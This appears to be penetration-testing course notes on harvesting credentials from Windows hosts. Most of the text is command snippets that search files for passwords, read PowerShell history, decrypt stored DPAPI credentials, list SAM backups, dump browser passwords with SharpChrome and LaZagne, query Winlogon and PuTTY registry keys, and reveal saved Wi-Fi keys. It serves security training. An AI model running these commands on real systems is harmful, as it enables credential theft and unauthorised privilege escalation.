# Credential Theft

In this section will cover:
- Credential Hunting
- Other Files
- Further Credential Theft

## Credential Hunting

Credentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. There are many places that we may find credentials on a system, some more obvious than others.

**Application Configuration Files**
````
# Searching for Files
> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Chrome Dictionary Files
> gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# PowerShell History File
> (Get-PSReadLineOption).HistorySavePath
> gc (Get-PSReadLineOption).HistorySavePath
> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
````
**Unattended Installation Files**

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded.

**PowerShell Credentials**

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using DPAPI, which typically means they can only be decrypted by the same user on the same computer they were created on.
Take, for example, the following script Connect-VC.ps1, which a sysadmin has created to connect to a vCenter server easily.
````
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
````
Decrypting PowerShell Credentials
````
> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
> $credential.GetNetworkCredential().username
> $credential.GetNetworkCredential().password
````

## Other Files

There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as Snaffler to crawl network share drives for interesting file extensions such as .kdbx, .vmdk, .vdhx, .ppk, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic passwords.txt file. 

**Manually Searching the File System for Credentials**
````
# Content file
> cd c:\Users\<user>\Documents & findstr /SI /M "password" *.xml *.ini *.txt
> findstr /si password *.xml *.ini *.txt *.config
> findstr /spin "password" *.*
> select-string -Path C:\Users\<user>\Documents\*.txt -Pattern password

# File Extension
> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
> where /R C:\ *.config
> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
````
**Sticky Notes Passwords**
````
# Looking for StickyNotes DB Files
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
# Copy the plum.sqlite
# Open this file in DB Browerser and to Note table
---------------------------------------------------
# View from Windonws Powershell
> Set-ExecutionPolicy Bypass -Scope Process
> cd .\PSSQLite\
> Import-Module .\PSSQLite.psd1
> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
````
**Other Files of Interest**
- %SYSTEMDRIVE%\pagefile.sys
- %WINDIR%\debug\NetSetup.log
- %WINDIR%\repair\sam
- %WINDIR%\repair\system
- %WINDIR%\repair\software, %WINDIR%\repair\security
- %WINDIR%\iis6.log
- %WINDIR%\system32\config\AppEvent.Evt
- %WINDIR%\system32\config\SecEvent.Evt
- %WINDIR%\system32\config\default.sav
- %WINDIR%\system32\config\security.sav
- %WINDIR%\system32\config\software.sav
- %WINDIR%\system32\config\system.sav
- %WINDIR%\system32\CCM\logs\*.log
- %USERPROFILE%\ntuser.dat
- %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
- %WINDIR%\System32\drivers\etc\hosts
- C:\ProgramData\Configs\*
- C:\Program Files\Windows PowerShell\*

## Further Credential Theft

There are many other techniques we can use to potentially obtain credentials on a Windows system.

**Cmdkey Saved Credentials**
````
> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: <pc>\bob

# Run Commands as Another User
> runas /savecred /user:<pc>\bob "COMMAND HERE"
````
**Browser Credentials**
````
# Retrieving Saved Credentials from Chrome
> .\SharpChrome.exe logins /unprotect
````
**Email**

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool MailSniper.

**More Fun with Credentials**
````
# Lazagne
> .\lazagne.exe all

# SessionGopher.ps1
> Import-Module .\SessionGopher.ps1
> Invoke-SessionGopher -Target <Server>
````
**Clear-Text Password Storage in the Registry**
````
# Windows AutoLogon
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Putty
> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<session>
````
**Wifi Passwords**
````
# Viewing Saved Wireless Networks
> netsh wlan show profile

# Retrieving Saved Wireless Passwords
> netsh wlan show profile <ssid> key=clear
````
